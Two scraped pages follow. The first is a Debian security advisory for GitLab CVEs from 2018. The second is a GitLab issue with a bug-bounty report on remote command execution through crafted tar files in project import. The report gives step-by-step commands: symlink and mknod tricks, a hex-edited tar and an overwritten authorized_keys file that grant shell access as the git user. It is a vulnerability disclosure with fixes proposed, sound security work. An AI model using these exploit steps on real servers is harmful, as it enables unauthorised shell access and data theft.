=== Content from www.debian.org_3910a7da_20250125_214913.html ===


---

[[Date Prev](msg00070.html)][[Date Next](msg00072.html)]
[[Thread Prev](msg00070.html)][[Thread Next](msg00072.html)]
[[Date Index](maillist.html#00071)]
[[Thread Index](threads.html#00071)]

# [SECURITY] [DSA 4145-1] gitlab security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 4145-1] gitlab security update
* *From*: Moritz Muehlenhoff <jmm@debian.org>
* *Date*: Sun, 18 Mar 2018 19:51:04 +0100
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/20180318185104.GA7103%40pisco.westfalen.local)Â [20180318185104.GA7103@pisco.westfalen.local](msg00071.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-4145-1                   security@debian.org
<https://www.debian.org/security/>                       Moritz Muehlenhoff
March 18, 2018                        <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : gitlab
CVE ID         : CVE-2017-0915 CVE-2017-0916 CVE-2017-0917 CVE-2017-0918
                 CVE-2017-0925 CVE-2017-0926 CVE-2018-3710

Several vulnerabilities have been discovered in Gitlab, a software
platform to collaborate on code:

CVE-2017-0915 / CVE-2018-3710

    Arbitrary code execution in project import.

CVE-2017-0916

    Command injection via Webhooks.

CVE-2017-0917

    Cross-site scripting in CI job output.

CVE-2017-0918

    Insufficient restriction of CI runner for project cache access.

CVE-2017-0925

    Information disclosure in Services API.

CVE-2017-0926

    Restrictions for disabled OAuth providers could be bypassed.

For the stable distribution (stretch), these problems have been fixed in
version 8.13.11+dfsg1-8+deb9u1.

We recommend that you upgrade your gitlab packages.

For the detailed security status of gitlab please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/gitlab>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEtuYvPRKsOElcDakFEMKTtsN8TjYFAlqutO4ACgkQEMKTtsN8
TjZjnQ/+KTZ1TKXjhz4YPdXRQU+omJ4tENM5G7Ayn5PosyTqzWA2SvNUmT9wDsi8
Y5xr2sw9jMoFzpv95sh8A1KRaaV1flDCnO/qIF7hN/6Wz1PZj1yZJRfzxZCNYlc/
Q1HXUFhVun8wTatlu/GC80GE39k/13hXYfZCLp9HPz//2aC8iNsF2KuRn9zyFPy6
PqpE1ZObcgagwG46JMrvB/bsQ+CRvasupOhhDkkl6+w5Mb5MECU+N2gl347BKGvg
InPoCsc2cihMaBMWtAQzr+C1NQyuKeLnK8BBTcxm72d4Ulcnnk03EK+wZDFY0/mN
rCUaxcmqC9DSHs/nIccWKVNRFpIXevX46QXZ/APbIgDAmDRaj2XYYM7GB3EkH0tE
GD9Tg3DK0PY4a9DO3yjA6OoHibtA58nNhFOwJEcpTbN72BhgL0kk5F8bjAeO14k0
TWHzH9QA/2GsJOczEHsoCsm4VxG3TIlEQh4/lYfCDLbpCT6JPjRJrtD23ANdnRZC
eccj+VWpt+M2sscjK6EfPqqEl+Ne+BQynGrCgIgCNKISyezHiXpaxycglQHunquk
d3eyEdw4/4CDmS5rBtw0LxVqEPmQsPe06Z9jsLb8dVAacPgXjTpufh4PvmFbQx+E
bnKue3Mr1Jkibb1v3cxmC6JHTc29JSn545veqvN3HnNQFq0E2FY=
=G7QV
-----END PGP SIGNATURE-----

```

---



=== Content from gitlab.com_f85d9ead_20250125_214913.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

Project 'gitlab-org/gitlab-ce' was moved to 'gitlab-org/gitlab-foss'. Please update any links and bookmarks that may still have the old path.

# Remote command execution via project import

From `@briann` in <https://hackerone.com/bugs?report_id=302959&subject=gitlab>:

GitLab is vulnerable to remote command execution via a directory traversal vulnerability in the project import feature. By using specially crafted tar files an attacker can overwrite any file owned by the git user, including that user's SSH authorized\_keys and config files, resulting in remote shell access.

This exploit was tested against GitLab CE and EE version 10.3.3.

Description:

This vulnerability has two primary causes:

GitLab's project import feature re-uses temporary directories for untar'ing project import files.
GitLab's project import feature only removes symlinks after an import file is successfully un-archived.
Using specially crafted tar files these two vulnerabilities can be combined to overwrite any file owned by the git user. The most effective method to exploit these vulnerabilities is to create two tar files. The first creates a symlink to the directory containing the file to overwrite and the second contains the file that will be used to perform the write. Crafting the second tar file in a way that does not overwrite the symlink with a directory is tricky, but details on how this can be accomplished are below.

To be clear we first upload a project of type "GitLab export" that contains a symlink. This import must fail after the symlink is written to the temporary directory (otherwise the symlink will be removed). We then upload a second project of the same name and type that contains a file under the previous symlink. Because the directory is re-used the symlink will be followed.

Steps To Reproduce:

1. Create the first tar archive. This archive needs to contain two files: a symlink pointing to the directory we want write access to and a file that will cause tar to exit with an error, resulting in the remove\_symlinks! method not executing and the symlink being left behind. In this case we include a block device file in the archive. When tar encounters this file it will be unable to create the block device (tar is not run as root) and exit with an error.

```
$ ln -s /var/opt/gitlab/.ssh ssh
$ sudo mknod test-fail b 8 0
$ ls -la
total 0
drwxr-xr-x   4 test    staff       128 Jan  6 18:51 .
drwxr-xr-x+ 20 test    staff       640 Jan  6 18:50 ..
lrwxr-xr-x   1 test    staff        20 Jan  6 18:50 ssh -> /var/opt/gitlab/.ssh
brw-r--r--   1 root    staff    0,   0 Jan  6 18:51 test-fail
$ tar -czf ../first.tgz *
```

2. Create the second tar archive. This archive will contain a two files. The first exists solely to allow the files to be extracted regardless of any errors. The second is named after our target file and contains the content we want to write. In this case we want to overwrite /var/opt/gitlab/.ssh/authorized\_keys file. Inside this file we place our public SSH key. This file must be mode 600 or sshd will ignore it.

```
$ touch foo                   # this may seem meaningless but I found that without a file preceding the directory entry the `authorized_keys` file might not be extracted before `tar` exits.
$ mkdir ssh
$ cd ssh
$ vi authorized_keys          # add our SSH key here
$ chmod 600 authorized_keys
$ ls -la
total 8
drwxr-xr-x  3 test  staff   96 Jan  6 18:53 .
drwxr-xr-x  3 test  staff   96 Jan  6 18:52 ..
-rw-------  1 test  staff  271 Jan  6 18:53 authorized_keys
$ cd ..
$ ls -la
total 0
drwxr-xr-x   4 test  staff  128 Jan  6 19:29 .
drwxr-xr-x+ 22 test  staff  704 Jan  6 19:29 ..
-rw-r--r--   1 test  staff    0 Jan  6 19:29 foo
drwxr-xr-x   3 test  staff   96 Jan  6 19:29 ssh
$ tar -cf ../second.tar *     # we don't want it compressed so we can hex edit it
```

Now if we try to upload this second file as-is we will see that tar will overwrite the symlink with a directory, blocking our exploit. To prevent this from happening we either need to remove the directory itself from the archive or find a way to prevent tar from successfully extracting the directory. As it turns out this is easy to accomplish with a hex editor. Changing the directory name in the tar archive will cause the checksum for that directory to fail and cause the directory entry to be ignored. The file inside the directory will then be extracted across the symlink. tar will exit with an error again but the damage is already done.

3. Open the second archive in a hex editor (this can also be done with vim). I used XCode. Open the file in XCode, hit command->shift->J, right-click on the file and choose to edit as hex. Find the ssh directory entry and rename it to ssy then save.
4. compress the archive or GitLab won't accept it.

```
$ gzip second.tar
```

5. Create a new project in GitLab. Choose "import project". Choose the "GitLab export" import type and upload the first archive. When the import fails, remove the project. After this completes we will see a directory of the name /var/opt/gitlab/gitlab-rails/shared/tmp/project\_exports// on the server that contains a symlink named ssh pointing to the git user's SSH config directory.
6. Create another project of same type with the same user/group and project name but this time importing the second archive. When the import is processed the authorized\_keys file for the git user will be overwritten with our key.
7. Login as git to the GitLab server. You will be given a user shell.

```
$ ssh git@gitlab.example.com
$ id
uid=998(git) gid=998(git) groups=998(git)
```

Supporting Material/References:
I've attached two sample tar files as a Proof-of-Concept. The first creates the symlink to /var/opt/gitlab/.ssh and the second contains a file named vulnerable that will be copied into the /var/opt/gitlab/.ssh directory.

Note: This exploit as written here would not work against GitLab instances using the database to authorize SSH access. However, in that case other files can be overwritten for access including the SSH config file, the GitLab code itself, Rails secrets, user crontab, etc.

Also: It might sound like the obvious solution is to delete the temporary import directory regardless of success or failure of the import, but this will not provide a complete fix. So long as the directory name is re-used the first tar archive could be designed to stall, allowing time for the second archive to be uploaded to the same location. It would be advisable instead to use random directory locations for all imports and to deny imports for any archive containing suspicious file types before they are written to the filesystem. Alternatively GitLab could use a file archive format that does not support dangerous file types.

Impact
An attacker with an account on the GitLab instance can gain shell access to the GitLab server with the permissions of the git user, allowing complete access to the application and repositories.

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


